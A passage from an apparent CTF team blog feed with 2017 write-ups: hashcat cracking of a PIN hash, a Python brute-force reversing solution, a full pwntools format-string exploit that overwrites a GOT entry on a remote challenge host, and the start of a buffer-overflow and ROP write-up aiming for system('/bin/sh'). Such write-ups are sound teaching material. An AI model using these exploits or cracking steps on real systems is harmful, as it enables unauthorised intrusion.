<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div><div class="line">bin:x:2:2:bin:/bin:/bin/sh</div><div class="line">sys:x:3:3:sys:/dev:/bin/sh</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/bin/sh</div><div class="line">man:x:6:12:man:/var/cache/man:/bin/sh</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div><div class="line">mail:x:8:8:mail:/var/mail:/bin/sh</div><div class="line">news:x:9:9:news:/var/spool/news:/bin/sh</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div><div class="line">proxy:x:13:13:proxy:/bin:/bin/sh</div><div class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</div><div class="line">backup:x:34:34:backup:/var/backups:/bin/sh</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div><div class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div><div class="line">pi:x:1000:1000:,,,:/home/pi:/bin/bash</div><div class="line">sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">ntp:x:102:104::/home/ntp:/bin/false</div><div class="line">statd:x:103:65534::/var/lib/nfs:/bin/false</div><div class="line">messagebus:x:104:106::/var/run/dbus:/bin/false</div><div class="line">usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/false</div><div class="line">lightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/false</div><div class="line">avahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</div><div class="line">b4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash</div></pre></td></tr></table></figure>
<p>The user is b4ckd00r_us3r we just need to bruteforce the pincode by looking at the code we know the pincode must be between 1 and 8 numbers using hashcat to crack the hash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">$ cat kasperskyhash </div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e</div><div class="line">$ cat example.dict </div><div class="line">b4ckd00r_us3r:</div><div class="line">$ hashcat -D 1,2 -m 1400 -a 6 -i --increment-min 1 --increment-max 8 kasperskyhash example.dict <span class="string">"?d?d?d?d?d?d?d?d"</span></div><div class="line">Session..........: hashcat                                </div><div class="line">Status...........: Exhausted</div><div class="line">Hash.Type........: SHA-256</div><div class="line">Hash.Target......: 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf22...ff222e</div><div class="line">Time.Started.....: Sun Oct  8 16:23:46 2017 (3 mins, 27 secs)</div><div class="line">Time.Estimated...: Sun Oct  8 16:27:13 2017 (0 secs)</div><div class="line">Guess.Base.......: File (example.dict), Left Side</div><div class="line">Guess.Mod........: Mask (?d?d?d?d?d?d?d) [7], Right Side</div><div class="line">Guess.Queue.Base.: 1/1 (100.00%)</div><div class="line">Guess.Queue.Mod..: 7/8 (87.50%)</div><div class="line">Speed.Dev.<span class="comment">#1.....:    45759 H/s (0.29ms)</span></div><div class="line">Speed.Dev.<span class="comment">#2.....:        0 H/s (0.00ms)</span></div><div class="line">Speed.Dev.<span class="comment">#*.....:    45759 H/s</span></div><div class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</div><div class="line">Progress.........: 10000000/10000000 (100.00%)</div><div class="line">Rejected.........: 0/10000000 (0.00%)</div><div class="line">Restore.Point....: 0/1 (0.00%)</div><div class="line">Candidates.<span class="comment">#1....: b4ckd00r_us3r:8939393 -&gt; b4ckd00r_us3r:9579393</span></div><div class="line">Candidates.<span class="comment">#2....: [Copying]</span></div><div class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 64c Fan: 46%</span></div><div class="line">HWMon.Dev.<span class="comment">#2.....: N/A</span></div><div class="line"></div><div class="line">Dictionary cache hit:</div><div class="line">* Filename..: example.dict</div><div class="line">* Passwords.: 1</div><div class="line">* Bytes.....: 15</div><div class="line">* Keyspace..: 100000000</div><div class="line"></div><div class="line">- Device <span class="comment">#2: autotuned kernel-accel to 160                </span></div><div class="line">- Device <span class="comment">#2: autotuned kernel-loops to 204</span></div><div class="line">- Device <span class="comment">#1: autotuned kernel-accel to 22                 </span></div><div class="line">- Device <span class="comment">#1: autotuned kernel-loops to 23</span></div><div class="line">[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&gt; The wordlist or mask that you are using is too small.</div><div class="line">This means that hashcat cannot use the full parallel power of your device(s).</div><div class="line">Unless you supply more work, your cracking speed will drop.</div><div class="line">For tips on supplying more work, see: https://hashcat.net/faq/morework</div><div class="line"></div><div class="line">Approaching final keyspace - workload adjusted.           </div><div class="line"></div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:<span class="variable">$HEX</span>[6234636b643030725f757333723a3132313731333337]</div><div class="line">$ cat ~/.hashcat/hashcat.potfile | tail -1</div><div class="line">34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:<span class="variable">$HEX</span>[6234636b643030725f757333723a3132313731333337]</div></pre></td></tr></table></figure>
<p>After a while it cracks, hashcat outputs the password in hex so lets decode it with bash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'6234636b643030725f757333723a3132313731333337'</span> | xxd -r -p</div><div class="line">b4ckd00r_us3r:12171337</div></pre></td></tr></table></figure>
<p>The flag was </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KLCTF&#123;b4ckd00r_us3r:12171337&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We receive
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="compiled" scheme="https://teamrocketist.github.io/tags/compiled/"/>
    
      <category term="hashcat" scheme="https://teamrocketist.github.io/tags/hashcat/"/>
    
      <category term="sha256" scheme="https://teamrocketist.github.io/tags/sha256/"/>
    
      <category term="kasperskyCtf" scheme="https://teamrocketist.github.io/tags/kasperskyCtf/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] BackdoorCTF 2017 - NO-CALM</title>
    <link href="https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/"/>
    <id>https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/</id>
    <published>2017-09-26T11:09:07.000Z</published>
    <updated>2017-09-26T11:17:04.585Z</updated>
    
    <content type="html"><![CDATA[<p>Reverse challenge, using IDA to convert the binary into c pseudo code:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mmkV78.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/7mmkV78.png" alt=""><br></a></p>
<p>We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in <code>if</code> check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of <code>if</code> verifications:<br><a data-fancybox="gallery" href="https://i.imgur.com/jwvteoW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jwvteoW.png" alt=""><br></a><br>We can see it checks 3 bytes at time, with 3 different operation checks:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(v7+v6-v8 == key[<span class="number">0</span>] &amp;&amp; v6-v7+v8 == key[<span class="number">1</span>] &amp;&amp; v7-v6+v8 == key[<span class="number">2</span>]) == <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">a =  string.printable</div><div class="line">keys = [<span class="number">81</span>,<span class="number">53</span>,<span class="number">87</span>,<span class="number">90</span>,<span class="number">156</span>,<span class="number">66</span>,<span class="number">98</span>,<span class="number">140</span>,<span class="number">92</span>,<span class="number">38</span>,<span class="number">170</span>,<span class="number">60</span>,<span class="number">29</span>,<span class="number">161</span>,<span class="number">69</span>,<span class="number">163</span>,<span class="number">27</span>,<span class="number">69</span>,<span class="number">147</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">86</span>,<span class="number">44</span>,<span class="number">67</span>,<span class="number">89</span>,<span class="number">75</span>,<span class="number">117</span>,<span class="number">125</span>,<span class="number">125</span>]</div><div class="line">flags = []</div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(keys),<span class="number">3</span>):</div><div class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> a:</div><div class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> a:</div><div class="line">				<span class="keyword">if</span> ord(c)+ord(b)-ord(d) == keys[i] <span class="keyword">and</span> ord(b)-ord(c)+ord(d) == keys[i+<span class="number">1</span>] <span class="keyword">and</span> ord(c)-ord(b)+ord(d) == keys[i+<span class="number">2</span>]:</div><div class="line">					s += b+c+d</div><div class="line">					<span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python nocalm.py </div><div class="line">CTF</div><div class="line">CTF&#123;No</div><div class="line">CTF&#123;Now_t</div><div class="line">CTF&#123;Now_th1s</div><div class="line">CTF&#123;Now_th1s_1s</div><div class="line">CTF&#123;Now_th1s_1s_t0</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_A</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGR</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Reverse challenge, using IDA to convert the binary into c pseudo code:&lt;br&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/7mmkV78.pn
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - baby0x41414141</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
    <published>2017-09-25T04:46:07.000Z</published>
    <updated>2017-10-05T02:52:19.667Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
<p>We have a format string vulnerability we can confirm this by running the binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./32_new </div><div class="line">Hello baby pwner, whats your name?</div><div class="line">%x</div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye 8048914</div></pre></td></tr></table></figure>
<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system(&#39;cat flag.txt&#39;)</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br><a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TIY3ZzO.png" alt=""><br></a><br><em>1.2 - flag function.</em></p>
<p>This one is really simple:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Calculate the offset of the address we put in the stack using %p.</div><div class="line">2 - Modify the exit function address with flag function using %n.</div></pre></td></tr></table></figure>
<p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">An optional length modifier, that specifies the size of the argument.</div><div class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</div><div class="line">         X conversion:</div><div class="line"></div><div class="line">         Modifier          d, i           o, u, x, X            n</div><div class="line">         hh                signed char    unsigned char         signed char *</div><div class="line">         h                 short          unsigned short        short *</div><div class="line">         l (ell)           long           unsigned long         long *</div><div class="line">         ll (ell ell)      long long      unsigned long long    long long *</div><div class="line">         j                 intmax_t       uintmax_t             intmax_t *</div><div class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</div><div class="line">         z                 (see note)     size_t                (see note)</div><div class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</div></pre></td></tr></table></figure>
<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
<p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hn'</span></div><div class="line">870b -&gt; <span class="string">'%10hn'</span></div></pre></td></tr></table></figure>
<h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line">r =getConn()</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></div><div class="line">r.sendline(s)</div></pre></td></tr></table></figure>
<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python 32_new.py </div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</div></pre></td></tr></table></figure>
<p>To access its position we can do like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hn'</span></div></pre></td></tr></table></figure>
<h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
<p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
<p>The full exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line"></div><div class="line">r =getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x08048724</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line">binary = ELF(<span class="string">'./32_new'</span>)</div><div class="line">FLAG = <span class="number">0x0804870b</span></div><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">r.sendline(s)</div><div class="line"><span class="keyword">print</span> r.recvall(timeout=<span class="number">1</span>)</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/pX6qbFQ.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/pX6qbF
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - Justdoit</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/</id>
    <published>2017-09-25T01:57:29.000Z</published>
    <updated>2017-09-25T04:54:39.302Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/zgcdKZK.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/zgcdKZK.png" alt=""><br></a></p>
<p><em>1.1 - representation of the assembly code of the binary</em></p>
<p>So we have 32 bit binary and a buffer overflow vulnerability, lets use <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">checksec</a> to see its protections:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    No canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<p>There isn’t a stack canary protection but we have <code>NX ENABLED</code> so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ objdump -R justdoit </div><div class="line"></div><div class="line">justdoit:     file format elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET   TYPE              VALUE </div><div class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</div><div class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">read</span>@GLIBC_2.0</div><div class="line">0804a010 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</div><div class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</div><div class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</div><div class="line">0804a01c R_386_JUMP_SLOT   write@GLIBC_2.0</div></pre></td></tr></table></figure>
<p>We have <code>write</code> which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge.</p>
<p>Here is the plan to exploit it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Overflow the buffer</div><div class="line">2 - Using ROP to leak GOT addresses with write function and return to main</div><div class="line">3 - Overflow the buffer again and jump to system with /bin/sh as argument</div></pre></td></tr></table></figure>
<h3 id="Overflow-the-buffer"><a href="#Overflow-the-buffer" class="headerlink" title="Overflow the buffer"></a>Overflow the buffer</h3><p>According to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use <code>metasploit</code> to create a 200 byte pattern:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div></pre></td></tr></table></figure>
<p>Now lets see on each address it will break using <code>gdb</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit </div><div class="line">Hello pwners, </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">Program received signal SIGSEGV (fault address 0x64413764)</div></pre></td></tr></table></figure>
<p>As we can see we have a page fault error at the address <code>0x64413764</code> so once again lets use <code>metasploit</code> to calculate the offset:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764</div><div class="line">[*] Exact match at offset 112</div></pre></td></tr></table></figure>
<h3 id="ROP-and-leak-libc-addresses"><a href="#ROP-and-leak-libc-addresses" class="headerlink" title="ROP and leak libc addresses"></a>ROP and leak libc addresses</h3><p><code>write</code> needs 3 arguments as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fildes, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes);</div></pre></td></tr></table></figure>
<p>We can use <code>pwntools</code> to get the GOT and PLT addresses from the binary (note that you can use <code>objdump</code> too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from <code>libc</code> you jump into <code>PLT</code> but if you want to leak an address from libc you get the value from the <code>GOT</code> address.</p>
